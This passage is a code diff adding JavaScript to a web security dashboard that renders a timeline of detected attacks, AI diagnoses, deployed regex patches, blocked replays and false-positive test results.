+    btn.classList.toggle('muted', alertsMuted);
+    btn.title = alertsMuted ? 'Alerts muted — click to unmute' : 'Toggle alert sounds';
+  });
+})();
+
+wafTabs.forEach(btn => {
+  btn.addEventListener('click', () => renderWafTab(btn.dataset.tab));
+});
+
+wafCopyBtn.addEventListener('click', () => {
+  navigator.clipboard.writeText(wafCode.textContent).then(() => {
+    wafCopyBtn.textContent = 'Copied!';
+    setTimeout(() => { wafCopyBtn.textContent = 'Copy'; }, 1500);
+  });
+});
+
+// ── Threat Timeline Engine ──────────────────────────────────────────────────
+
+/**
+ * Feed a security event into the timeline state machine.
+ * Called for both live events and replayed history.
+ */
+function updateTimeline(d) {
+  switch (d.type) {
+    case 'incoming':
+      // Store as pending until we know if it becomes malicious
+      pendingTimelines.set(d.trace_id, d);
+      break;
+
+    case 'diagnosis':
+      if (d.status !== 'malicious') {
+        pendingTimelines.delete(d.trace_id);
+        break;
+      }
+      tlEnsureEntry(d.trace_id, d);
+      tlAddStep(d.trace_id, 'diagnosed', d.timestamp,
+        `🧠 AI diagnosis: MALICIOUS — ${d.attack_type || 'Unknown'}`,
+        `Severity: ${d.severity || '?'} · CVE: ${d.cve || d.cve_reference || '—'} · Confidence: ${
+          typeof d.confidence === 'number' ? Math.round(d.confidence * 100) + '%' : '?'}`
+      );
+      if (d.regex_patch) {
+        tlAddStep(d.trace_id, 'patched', d.timestamp,
+          `🩹 Patch deployed`,
+          `Regex: ${d.regex_patch}${d.low_confidence ? '  ⏱ provisional (5 min auto-expiry)' : ''}`
+        );
+        patchToTrace.set(d.regex_patch, d.trace_id);
+        const entry = timelineTraces.get(d.trace_id);
+        if (entry) { entry.status = 'patched'; entry.regex = d.regex_patch; }
+      }
+      tlRender();
+      break;
+
+    case 'blocked': {
+      if (d.reason === 'ip_banned') break;
+      const origId = patchToTrace.get(d.pattern);
+      if (!origId) break;
+      const orig = timelineTraces.get(origId);
+      if (!orig) break;
+      // Calculate block delta from when the replay was received
+      const replayIncoming = pendingTimelines.get(d.trace_id);
+      const deltaMs = replayIncoming
+        ? Math.round((d.timestamp - replayIncoming.timestamp) * 1000)
+        : null;
+      const deltaStr = deltaMs !== null ? ` · blocked in ${deltaMs} ms` : '';
+      tlAddStep(origId, 'blocked', d.timestamp,
+        `🛡 Replay blocked${deltaStr}`,
+        `Replay trace: ${d.trace_id ? d.trace_id.slice(0, 8) + '…' : '—'}`
+      );
+      orig.status = 'blocked';
+      pendingTimelines.delete(d.trace_id);
+      tlRender();
+      break;
+    }
+
+    case 'patch_expired': {
+      const expiredId = d.regex_patch ? patchToTrace.get(d.regex_patch) : null;
+      if (expiredId && timelineTraces.has(expiredId)) {
+        tlAddStep(expiredId, 'expired', d.timestamp,
+          `⏱ Provisional patch auto-expired`,
+          `Confidence was below 70% — patch rolled back to prevent false positives`
+        );
+        timelineTraces.get(expiredId).status = 'expired';
+        tlRender();
+      }
+      break;
+    }
+
+    case 'false_positive_result': {
+      // Find the timeline entry that owns this patch and add the FP step
+      const fpTraceId = d.regex_patch ? patchToTrace.get(d.regex_patch) : d.trace_id;
+      const fpTarget  = fpTraceId || d.trace_id;
+      if (fpTarget && timelineTraces.has(fpTarget)) {
+        const icon  = d.failed === 0 ? '✅' : '⚠';
+        const label = d.failed === 0
+          ? `${icon} False-positive test: ${d.passed}/${d.total} benign — 0 FP`
+          : `${icon} False-positive test: ${d.failed}/${d.total} BLOCKED`;
+        const sub = d.failed === 0
+          ? `All legitimate traffic still passes through the patch`
+          : `Patch may be too broad — ${d.failed} legit request(s) incorrectly blocked`;
+        tlAddStep(fpTarget, 'fp_test', d.timestamp, label, sub);
+        tlRender();
+      }
+      break;
+    }
+  }
+}
+
+/** Promote pending incoming entry or create a new one for this trace. */
+function tlEnsureEntry(traceId, diagEvent) {
+  if (timelineTraces.has(traceId)) return;
+  const incoming = pendingTimelines.get(traceId);
+  const entry = {
+    trace_id:    traceId,
+    attack_type: diagEvent.attack_type  || 'Unknown',
+    severity:    diagEvent.severity     || '',
+    client_ip:   incoming?.client_ip    || diagEvent.client_ip || '',
+    method:      incoming?.method       || diagEvent.method || '',
+    path:        incoming?.path         || diagEvent.path  || '',
+    status:      'diagnosed',
+    regex:       null,
+    steps:       [],
+    last_ts:     diagEvent.timestamp,
+  };
+  timelineTraces.set(traceId, entry);
+  pendingTimelines.delete(traceId);
+
+  // Add the "received" step using the incoming timestamp if available
+  if (incoming) {
+    tlAddStep(traceId, 'received', incoming.timestamp,
+      `▶ Attack received`,
+      `${incoming.method} ${incoming.path} · IP: ${incoming.client_ip || '—'}`
+    );
+  }
+}
+
+/** Push a step onto a trace entry (idempotent by type for replays). */
+function tlAddStep(traceId, type, ts, label, sub) {
+  const entry = timelineTraces.get(traceId);
+  if (!entry) return;
+  // Allow multiple 'blocked' steps (multiple replays); dedupe others
+  if (type !== 'blocked' && entry.steps.some(s => s.type === type)) return;
+  entry.steps.push({ type, ts, label, sub });
+  if (ts > entry.last_ts) entry.last_ts = ts;
+}
+
+/** Render/update all timeline cards in the DOM. */
+function tlRender() {
+  const container = document.getElementById('timeline-entries');
+
+  // Remove placeholder
+  const placeholder = container.querySelector('.tl-empty');
+  if (placeholder) placeholder.remove();
+
+  // Sort by last activity, newest first, cap at TL_MAX
+  const sorted = [...timelineTraces.values()]
+    .sort((a, b) => b.last_ts - a.last_ts)
+    .slice(0, TL_MAX);
+
+  document.getElementById('timeline-count').textContent =
+    `${timelineTraces.size} threat${timelineTraces.size !== 1 ? 's' : ''} tracked`;
+
+  // Upsert each card
+  sorted.forEach(entry => {
+    const id  = 'tl-' + entry.trace_id;
+    let card  = document.getElementById(id);
+    const html = tlBuildCard(entry);
+    if (card) {
+      card.outerHTML = html;
+    } else {
+      container.insertAdjacentHTML('afterbegin', html);
+    }
+  });
+
+  // Remove cards no longer in the top TL_MAX
+  const keepIds = new Set(sorted.map(e => 'tl-' + e.trace_id));
+  container.querySelectorAll('.tl-entry').forEach(el => {
+    if (!keepIds.has(el.id)) el.remove();
+  });
+}
+
+function tlBuildCard(entry) {
+  const sevClass = entry.severity ? `sev-${entry.severity}` : '';
+  const statusLabel = entry.status.toUpperCase();
+  const headerSev = entry.severity
+    ? `<span class="patch-severity tl-sev-badge ${sevClass}">${escHtml(entry.severity)}</span>` : '';
+
+  const stepsHtml = entry.steps.map(s => {
+    const time = s.ts ? new Date(s.ts * 1000).toLocaleTimeString() : '—';
+    const pending = !s.ts ? ' tl-pending' : '';
+    return `
+      <div class="tl-step tl-${s.type}${pending}">
+        <span class="tl-step-time">${escHtml(time)}</span>
+        <span class="tl-step-body">
+          ${escHtml(s.label)}
+          ${s.sub ? `<span class="tl-step-sub">${escHtml(s.sub)}</span>` : ''}
+        </span>
+      </div>`;
+  }).join('');
+
+  return `
+    <div class="tl-entry tl-status-${entry.status}" id="tl-${escHtml(entry.trace_id)}">
+      <div class="tl-entry-header">
+        <span class="tl-trace-id">${escHtml(entry.trace_id.slice(0, 8))}…</span>
+        <span class="tl-attack-badge">${escHtml(entry.attack_type)}</span>
+        ${headerSev}
+        ${entry.client_ip ? `<span style="color:var(--text-dim);font-size:10px;">IP: ${escHtml(entry.client_ip)}</span>` : ''}
+        <span class="tl-status-badge ${entry.status}">${escHtml(statusLabel)}</span>
+      </div>
+      <div class="tl-steps">${stepsHtml}</div>
+    </div>`;
+}
+</script>
+
+</body>
+</html>
